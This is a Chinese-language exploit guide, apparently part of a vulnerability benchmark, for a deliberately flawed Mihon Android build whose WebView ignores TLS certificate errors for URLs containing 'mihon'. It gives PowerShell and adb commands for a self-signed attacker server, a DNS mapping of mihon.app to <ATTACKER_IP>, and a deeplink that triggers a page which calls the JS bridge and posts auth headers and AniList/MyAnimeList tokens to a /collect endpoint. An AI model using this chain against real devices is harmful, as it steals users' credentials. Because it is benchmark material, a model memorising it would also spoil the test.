# 4.1 TLS / Certificate Validation Error EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<trusted_help_url>` 会把 URL 转交给 `WebViewActivity`。该漏洞样本会把 `https://mihon.app/...` 识别为可信帮助页并注册 `window.mihonAndroidBridge`。

当 WebView 加载 `https://mihon.app:8443/exp/4.1` 时，本 EXP 服务使用自签名证书触发证书错误。漏洞样本中的 `onReceivedSslError` 只要发现错误 URL 包含 `mihon` 就调用 `handler.proceed()`，页面继续加载并在可信帮助上下文中调用 bridge 窃取：

- `window.mihonAndroidBridge.getSourceAuthHeader()`
- `window.mihonAndroidBridge.getTrackToken(service)`
- `window.mihonAndroidBridge.getTrackAuthHeader(service)`

回收结果写入服务端 `received` 目录。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\4.1_TLS_Certificate_Validation_Error
python .\server.py
```

服务端监听：

- `8000`: HTTP 辅助服务
- `8443`: HTTPS 自签名证书攻击页面 `/exp/4.1`，同源 HTTPS 数据回收 `/collect`

## 准备域名解析

触发 URL 必须保持 host 为 `mihon.app`，否则样本不会注册可信帮助页 bridge。测试时需要让设备把 `mihon.app` 解析到运行 `server.py` 的机器 IP。

常见做法之一是在测试设备或模拟器环境中配置 hosts/DNS，把：

```text
mihon.app -> <ATTACKER_IP>
```

映射到攻击机。模板证书包含 `mihon.app`，但证书是自签名证书，仍会触发 WebView 的 SSL 错误。

## 触发 deeplink

确保设备访问 `https://mihon.app:8443` 会到达运行 `server.py` 的机器。EXP 默认将敏感数据回传到同源 HTTPS `https://mihon.app:8443/collect`，避免 HTTPS 页面向 HTTP 回传时被 WebView 阻止：

```powershell
$AttackUrl = "https://mihon.app:8443/exp/4.1"
$DeepLink = "mihon://help/webview?url=$([uri]::EscapeDataString($AttackUrl))"
adb shell am start -a android.intent.action.VIEW -d "$DeepLink"
```

也可以直接使用编码后的形式：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=https%3A%2F%2Fmihon.app%3A8443%2Fexp%2F4.1"
```

## 成功标志

WebView 页面显示：

```text
证书错误页面已继续加载，mihonAndroidBridge 可用。
```

服务端 `received` 目录中出现 `collected_<timestamp>.txt`，内容包含：

- `bridge_status=available_after_ssl_error`
- `sourceAuthHeader`
- `trackToken_anilist`
- `trackAuth_myanimelist`

这些值来自漏洞样本内 `app/src/main/assets/benchmark_mock_data.json`。

## 说明

EXP 文件不纳入 git 管理，不需要提交到漏洞分支或修复分支。
